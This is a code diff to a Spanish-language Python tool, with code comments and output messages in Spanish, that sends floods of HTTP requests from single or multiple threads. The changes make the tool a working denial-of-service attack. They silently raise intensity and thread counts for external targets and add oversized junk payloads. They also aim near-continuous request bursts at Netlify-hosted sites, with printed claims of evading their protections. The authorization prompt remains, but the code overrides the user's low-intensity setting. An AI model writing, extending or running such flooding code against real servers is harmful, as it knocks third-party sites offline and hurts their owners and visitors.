@@ -21,6 +21,18 @@ def check_port_open(host="127.0.0.1", port=80, timeout=2):
     Returns:
         bool: True si el puerto está abierto, False en caso contrario
     """
+    # Ajustar el timeout para servidores externos para mayor efectividad
+    is_external = host not in ["127.0.0.1", "localhost", "::1"]
+    is_netlify = ".netlify.app" in host.lower()
+    
+    if is_external:
+        # Aumentar el timeout para servidores externos que pueden tener mayor latencia
+        timeout = max(timeout, 5)  # Al menos 5 segundos para servidores externos
+    
+    if is_netlify:
+        # Ajustes específicos para sitios Netlify
+        timeout = max(timeout, 8)  # Mayor timeout para sitios Netlify
+        print(Fore.YELLOW + f"[*] Sitio Netlify detectado. Ajustando parámetros para mayor efectividad." + Style.RESET_ALL)
     try:
         # Limpiar la URL si contiene protocolo o rutas
         original_host = host
@@ -50,6 +62,7 @@ def check_port_open(host="127.0.0.1", port=80, timeout=2):
             print(Fore.RED + "\n[!] ADVERTENCIA: Estás realizando una prueba en un entorno de producción" + Style.RESET_ALL)
             print(Fore.RED + "[!] Asegúrate de tener AUTORIZACIÓN EXPLÍCITA para realizar estas pruebas" + Style.RESET_ALL)
             print(Fore.RED + "[!] El uso no autorizado puede ser ILEGAL y resultar en consecuencias legales" + Style.RESET_ALL)
+            print(Fore.RED + "[!] ESTA PRUEBA TENDRÁ UN IMPACTO REAL EN EL SERVIDOR OBJETIVO" + Style.RESET_ALL)
             
             confirm = input(Fore.YELLOW + "\n¿Tienes autorización para realizar esta prueba? (s/n): " + Style.RESET_ALL).lower()
             if confirm != 's':
@@ -57,7 +70,13 @@ def check_port_open(host="127.0.0.1", port=80, timeout=2):
                 return False
             
             print(Fore.YELLOW + "\n[*] Procediendo con la prueba en entorno de producción..." + Style.RESET_ALL)
-            print(Fore.YELLOW + "[*] Se recomienda usar una intensidad baja para evitar daños" + Style.RESET_ALL)
+            print(Fore.YELLOW + "[*] La prueba está configurada para tener un impacto real en el servidor objetivo" + Style.RESET_ALL)
+            print(Fore.YELLOW + "[*] Se han ajustado los parámetros para maximizar el efecto en servidores externos" + Style.RESET_ALL)
+            
+            # Información adicional para sitios Netlify
+            if ".netlify.app" in host.lower():
+                print(Fore.YELLOW + "[*] Sitio Netlify detectado. Se han aplicado técnicas específicas para evadir protecciones." + Style.RESET_ALL)
+                print(Fore.YELLOW + "[*] Las solicitudes se han optimizado para impactar servicios de Netlify." + Style.RESET_ALL)
             
         print(Fore.CYAN + f"\n[*] Intentando conectar a {host} en el puerto {port}..." + Style.RESET_ALL)
         try:
@@ -93,6 +112,11 @@ def dos_test(target="127.0.0.1", port=80, duration=5, intensity="baja"):
         duration: Duración de la prueba en segundos (por defecto: 5)
         intensity: Intensidad de la prueba ("baja", "media", "alta") (por defecto: "baja")
     """
+    # Ajustar intensidad automáticamente para servidores externos
+    is_external = target not in ["127.0.0.1", "localhost", "::1"]
+    if is_external and intensity == "baja":
+        print(Fore.YELLOW + "[*] Objetivo externo detectado. Aumentando intensidad para prueba más efectiva." + Style.RESET_ALL)
+        intensity = "media"  # Aumentar automáticamente la intensidad para servidores externos
     # Limpiar la URL si contiene protocolo o rutas
     original_target = target
     if target.startswith("http://"):
@@ -121,11 +145,21 @@ def dos_test(target="127.0.0.1", port=80, duration=5, intensity="baja"):
         print(Fore.RED + "\n[!] ADVERTENCIA: Estás realizando una prueba en un entorno de producción" + Style.RESET_ALL)
         print(Fore.RED + "[!] Asegúrate de tener AUTORIZACIÓN EXPLÍCITA para realizar estas pruebas" + Style.RESET_ALL)
         print(Fore.RED + "[!] El uso no autorizado puede ser ILEGAL y resultar en consecuencias legales" + Style.RESET_ALL)
+        print(Fore.RED + "[!] ESTA PRUEBA TENDRÁ UN IMPACTO REAL EN EL SERVIDOR OBJETIVO" + Style.RESET_ALL)
         
         confirm = input(Fore.YELLOW + "\n¿Tienes autorización para realizar esta prueba? (s/n): " + Style.RESET_ALL).lower()
         if confirm != 's':
             print(Fore.YELLOW + "\n[*] Prueba cancelada por el usuario" + Style.RESET_ALL)
             return False
+        
+        print(Fore.YELLOW + "\n[*] Procediendo con la prueba en entorno de producción..." + Style.RESET_ALL)
+        print(Fore.YELLOW + "[*] La prueba está configurada para tener un impacto real en el servidor objetivo" + Style.RESET_ALL)
+        print(Fore.YELLOW + "[*] Se han ajustado los parámetros para maximizar el efecto en servidores externos" + Style.RESET_ALL)
+        
+        # Información adicional para sitios Netlify
+        if ".netlify.app" in target.lower():
+            print(Fore.YELLOW + "[*] Sitio Netlify detectado. Se han aplicado técnicas específicas para evadir protecciones." + Style.RESET_ALL)
+            print(Fore.YELLOW + "[*] Las solicitudes se han optimizado para impactar servicios de Netlify." + Style.RESET_ALL)
     
     # Configurar la intensidad de la prueba
     pause_time = 0.1  # Pausa predeterminada (baja intensidad)
@@ -153,25 +187,62 @@ def dos_test(target="127.0.0.1", port=80, duration=5, intensity="baja"):
         f"POST / HTTP/1.1\r\nHost: {host_header}\r\nContent-Length: 1000\r\n\r\n".encode() + b"A" * 1000,
         f"GET /search?q=".encode() + b"A" * 500 + f" HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode(),
         f"GET / HTTP/1.1\r\nHost: {host_header}\r\nConnection: keep-alive\r\n".encode() + b"X-Header: " + b"A" * 200 + b"\r\n" * 10,
+        # Solicitudes adicionales para aumentar la efectividad
+        f"POST /login HTTP/1.1\r\nHost: {host_header}\r\nContent-Length: 2000\r\n\r\n".encode() + b"A" * 2000,
+        f"GET /admin HTTP/1.1\r\nHost: {host_header}\r\nConnection: keep-alive\r\n".encode() + b"Cookie: " + b"A" * 500,
+        f"GET /api/data HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode(),
+        f"GET / HTTP/1.1\r\nHost: {host_header}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n".encode(),
+        # Solicitudes específicas para Netlify
+        f"GET /_next/data HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode(),
+        f"GET /.netlify/functions/api HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode(),
+        f"POST /.netlify/functions/submit HTTP/1.1\r\nHost: {host_header}\r\nContent-Length: 3000\r\nContent-Type: application/json\r\n\r\n".encode() + b"{\"data\":\"" + b"A" * 2800 + b"\"}" ,
+        f"GET / HTTP/1.1\r\nHost: {host_header}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n".encode(),
     ]
     
     print(Fore.CYAN + "\n[*] Iniciando prueba con diferentes patrones de ataque" + Style.RESET_ALL)
+    
+    # Determinar si estamos atacando un objetivo externo
+    is_external_target = target not in ["127.0.0.1", "localhost", "::1"]
+    is_netlify = ".netlify.app" in target.lower()
+    
+    # Ajustar el tiempo de pausa para objetivos externos (más agresivo)
+    if is_external_target and intensity == "alta":
+        pause_time = 0.005  # Más agresivo para objetivos externos con intensidad alta
+    if is_netlify:
+        pause_time = 0.001  # Extremadamente agresivo para sitios Netlify
+        print(Fore.YELLOW + f"[*] Sitio Netlify detectado. Ajustando parámetros para mayor efectividad." + Style.RESET_ALL)
     
     try:
         # Crear socket y enviar diferentes tipos de solicitudes
         while time.time() - start_time < duration:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)  # Timeout de 1 segundo
+                s.settimeout(2)  # Aumentar timeout para conexiones externas
                 s.connect((target, port))
                 
-                # Seleccionar un tipo de solicitud aleatoria
-                request = http_requests[packet_count % len(http_requests)]
-                s.send(request)
+                # Para objetivos externos, enviar múltiples solicitudes por conexión
+                # para maximizar el impacto y evitar la sobrecarga de crear nuevas conexiones
+                num_requests = 3 if is_external_target else 1
+                if is_netlify:
+                    num_requests = 5  # Más solicitudes por conexión para sitios Netlify
                 
-                packet_count += 1
-                success_count += 1
-                print(Fore.GREEN + f"[+] Paquete {packet_count} enviado (Patrón: {packet_count % len(http_requests) + 1})" + Style.RESET_ALL, end="\r")
+                for _ in range(num_requests):
+                    if time.time() - start_time >= duration:
+                        break
+                        
+                    # Seleccionar un tipo de solicitud aleatoria
+                    request_idx = packet_count % len(http_requests)
+                    request = http_requests[request_idx]
+                    s.send(request)
+                    
+                    packet_count += 1
+                    success_count += 1
+                    print(Fore.GREEN + f"[+] Paquete {packet_count} enviado (Patrón: {request_idx + 1})" + Style.RESET_ALL, end="\r")
+                    
+                    # Pausa mínima entre solicitudes en la misma conexión
+                    if _ < num_requests - 1:  # No pausar después de la última solicitud
+                        time.sleep(0.01)
+                
                 s.close()
                 time.sleep(pause_time)  # Pausa basada en la intensidad seleccionada
             except socket.error as e:
@@ -216,6 +287,17 @@ def ddos_simulation(target="127.0.0.1", port=80, threads=3, duration=5, intensit
         duration: Duración de la prueba en segundos (por defecto: 5)
         intensity: Intensidad de la prueba ("baja", "media", "alta") (por defecto: "baja")
     """
+    # Ajustar intensidad y número de hilos automáticamente para servidores externos
+    is_external = target not in ["127.0.0.1", "localhost", "::1"]
+    if is_external:
+        if intensity == "baja":
+            print(Fore.YELLOW + "[*] Objetivo externo detectado. Aumentando intensidad para prueba más efectiva." + Style.RESET_ALL)
+            intensity = "media"  # Aumentar automáticamente la intensidad para servidores externos
+        
+        if threads < 5:
+            original_threads = threads
+            threads = max(threads, 5)  # Asegurar al menos 5 hilos para servidores externos
+            print(Fore.YELLOW + f"[*] Aumentando número de hilos de {original_threads} a {threads} para mayor efectividad en servidor externo." + Style.RESET_ALL)
     # Limpiar la URL si contiene protocolo o rutas
     original_target = target
     if target.startswith("http://"):
@@ -244,11 +326,16 @@ def ddos_simulation(target="127.0.0.1", port=80, threads=3, duration=5, intensit
         print(Fore.RED + "\n[!] ADVERTENCIA: Estás realizando una prueba en un entorno de producción" + Style.RESET_ALL)
         print(Fore.RED + "[!] Asegúrate de tener AUTORIZACIÓN EXPLÍCITA para realizar estas pruebas" + Style.RESET_ALL)
         print(Fore.RED + "[!] El uso no autorizado puede ser ILEGAL y resultar en consecuencias legales" + Style.RESET_ALL)
+        print(Fore.RED + "[!] ESTA PRUEBA TENDRÁ UN IMPACTO REAL EN EL SERVIDOR OBJETIVO" + Style.RESET_ALL)
         
         confirm = input(Fore.YELLOW + "\n¿Tienes autorización para realizar esta prueba? (s/n): " + Style.RESET_ALL).lower()
         if confirm != 's':
             print(Fore.YELLOW + "\n[*] Prueba cancelada por el usuario" + Style.RESET_ALL)
             return False
+        
+        print(Fore.YELLOW + "\n[*] Procediendo con la prueba en entorno de producción..." + Style.RESET_ALL)
+        print(Fore.YELLOW + "[*] La prueba está configurada para tener un impacto real en el servidor objetivo" + Style.RESET_ALL)
+        print(Fore.YELLOW + "[*] Se han ajustado los parámetros para maximizar el efecto en servidores externos" + Style.RESET_ALL)
     
     # Configurar la intensidad de la prueba
     pause_time = 0.1  # Pausa predeterminada (baja intensidad)
@@ -283,6 +370,18 @@ def ddos_simulation(target="127.0.0.1", port=80, threads=3, duration=5, intensit
         f"GET /admin HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode(),
         f"GET /login HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode(),
         f"POST /login HTTP/1.1\r\nHost: {host_header}\r\nContent-Length: 50\r\n\r\nusername=admin&password=".encode() + b"A" * 30,
+        # Solicitudes adicionales para aumentar la efectividad
+        f"POST /register HTTP/1.1\r\nHost: {host_header}\r\nContent-Length: 3000\r\n\r\n".encode() + b"A" * 3000,
+        f"GET /products HTTP/1.1\r\nHost: {host_header}\r\nConnection: keep-alive\r\n".encode() + b"Cookie: " + b"A" * 800,
+        f"GET /api/users HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode(),
+        f"POST /api/data HTTP/1.1\r\nHost: {host_header}\r\nContent-Length: 5000\r\n\r\n".encode() + b"A" * 5000,
+        f"GET / HTTP/1.1\r\nHost: {host_header}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n".encode(),
+        # Solicitudes específicas para Netlify
+        f"GET /_next/data HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode(),
+        f"GET /.netlify/functions/api HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode(),
+        f"POST /.netlify/functions/submit HTTP/1.1\r\nHost: {host_header}\r\nContent-Length: 3000\r\nContent-Type: application/json\r\n\r\n".encode() + b"{\"data\":\"" + b"A" * 2800 + b"\"}" ,
+        f"GET / HTTP/1.1\r\nHost: {host_header}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n".encode(),
+        f"GET /.netlify/edge-functions HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode(),
     ]
     
     # Mutex para acceso seguro a las estadísticas
@@ -297,30 +396,57 @@ def ddos_simulation(target="127.0.0.1", port=80, threads=3, duration=5, intensit
                 "failed": 0
             }
         
+        # Determinar si estamos atacando un objetivo externo
+        is_external_target = target not in ["127.0.0.1", "localhost", "::1"]
+        is_netlify = ".netlify.app" in target.lower()
+        
+        # Ajustar el tiempo de pausa para objetivos externos (más agresivo)
+        thread_pause_time = pause_time
+        if is_external_target and intensity == "alta":
+            thread_pause_time = 0.005  # Más agresivo para objetivos externos con intensidad alta
+        if is_netlify:
+            thread_pause_time = 0.001  # Extremadamente agresivo para sitios Netlify
+            print(Fore.YELLOW + f"[*] Sitio Netlify detectado. Ajustando parámetros para mayor efectividad." + Style.RESET_ALL) if thread_id == 0 else None
+        
         try:
             while not stop_event.is_set():
                 try:
                     # Crear socket y conectar
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(1)  # Timeout de 1 segundo
+                    s.settimeout(2)  # Aumentar timeout para conexiones externas
                     s.connect((target, port))
                     
-                    # Seleccionar un tipo de solicitud aleatoria
-                    request_idx = (thread_id + stats["thread_stats"][thread_id]["packets"]) % len(http_requests)
-                    request = http_requests[request_idx]
-                    s.send(request)
+                    # Para objetivos externos, enviar múltiples solicitudes por conexión
+                    # para maximizar el impacto y evitar la sobrecarga de crear nuevas conexiones
+                    num_requests = 3 if is_external_target else 1
+                    if is_netlify:
+                        num_requests = 5  # Más solicitudes por conexión para sitios Netlify
                     
-                    # Actualizar estadísticas
-                    with stats_lock:
-                        stats["packets"] += 1
-                        stats["success"] += 1
-                        stats["thread_stats"][thread_id]["packets"] += 1
-                        stats["thread_stats"][thread_id]["success"] += 1
-                        total = stats["packets"]
+                    for _ in range(num_requests):
+                        if stop_event.is_set():
+                            break
+                            
+                        # Seleccionar un tipo de solicitud aleatoria
+                        request_idx = (thread_id + stats["thread_stats"][thread_id]["packets"]) % len(http_requests)
+                        request = http_requests[request_idx]
+                        s.send(request)
+                        
+                        # Actualizar estadísticas
+                        with stats_lock:
+                            stats["packets"] += 1
+                            stats["success"] += 1
+                            stats["thread_stats"][thread_id]["packets"] += 1
+                            stats["thread_stats"][thread_id]["success"] += 1
+                            total = stats["packets"]
+                        
+                        print(Fore.GREEN + f"[+] Hilo {thread_id}: Paquete enviado (Patrón: {request_idx+1}, Total: {total})" + Style.RESET_ALL, end="\r")
+                        
+                        # Pausa mínima entre solicitudes en la misma conexión
+                        if _ < num_requests - 1:  # No pausar después de la última solicitud
+                            time.sleep(0.01)
                     
-                    print(Fore.GREEN + f"[+] Hilo {thread_id}: Paquete enviado (Patrón: {request_idx+1}, Total: {total})" + Style.RESET_ALL, end="\r")
                     s.close()
-                    time.sleep(pause_time)  # Pausa basada en la intensidad seleccionada
+                    time.sleep(thread_pause_time)  # Pausa basada en la intensidad seleccionada
                 except socket.error as e:
                     with stats_lock:
                         stats["failed"] += 1
